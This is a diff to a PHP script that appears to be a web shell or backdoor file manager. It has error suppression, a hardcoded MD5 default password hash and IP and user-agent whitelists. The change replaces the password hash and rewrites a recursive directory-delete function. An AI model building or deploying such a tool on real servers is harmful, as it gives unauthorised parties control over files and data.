@@ -8,7 +8,7 @@ ini_set('display_errors', 0);
 set_time_limit(0);
 
 // Default password hash using MD5 for 'myp@ssw0rd'
-$default_password_hash = '2ebba5cd75576c408240e57110e7b4ff';
+$default_password_hash = '2516c14835697b9239a4891ac3b63a33';
 
 $WHITELISTED_IPS = [];
 $WHITELISTED_USER_AGENTS = [];
@@ -729,18 +729,24 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                                     ['status' => 'success', 'message' => 'File deleted: '.htmlspecialchars(basename($itemPath))] :
                                     ['message' => '[Error] Failed to delete file. Check permissions.'];
                     } elseif (is_dir($itemPath)) {
+                        // FIX: Replaced the old non-functional recursive delete with a new robust one.
+                        // This function uses scandir to find all files (including hidden ones) and deletes them recursively.
                         function deleteDirectoryRecursive($dir) {
                             if (!file_exists($dir) || !is_dir($dir)) return false;
-                            if (substr($dir, strlen($dir) - 1, 1) != DIRECTORY_SEPARATOR) $dir .= DIRECTORY_SEPARATOR;
-                            $files = glob($dir . '*', GLOB_MARK);
-                            foreach ($files as $file) {
-                                if (is_dir($file)) deleteDirectoryRecursive($file); else @unlink($file);
+                            $items = array_diff(scandir($dir), ['.', '..']);
+                            foreach ($items as $item) {
+                                $path = $dir . DIRECTORY_SEPARATOR . $item;
+                                if (is_dir($path)) {
+                                    deleteDirectoryRecursive($path);
+                                } else {
+                                    @unlink($path);
+                                }
                             }
                             return @rmdir($dir);
                         }
                         $response = deleteDirectoryRecursive($itemPath) ?
                                     ['status' => 'success', 'message' => 'Directory deleted: '.htmlspecialchars(basename($itemPath))] :
-                                    ['message' => '[Error] Failed to delete directory. Ensure it is empty or check permissions.'];
+                                    ['message' => '[Error] Failed to delete directory. Check permissions.'];
                     } else {
                         $response['message'] = '[Error] Item is not a file or directory.';
                     }
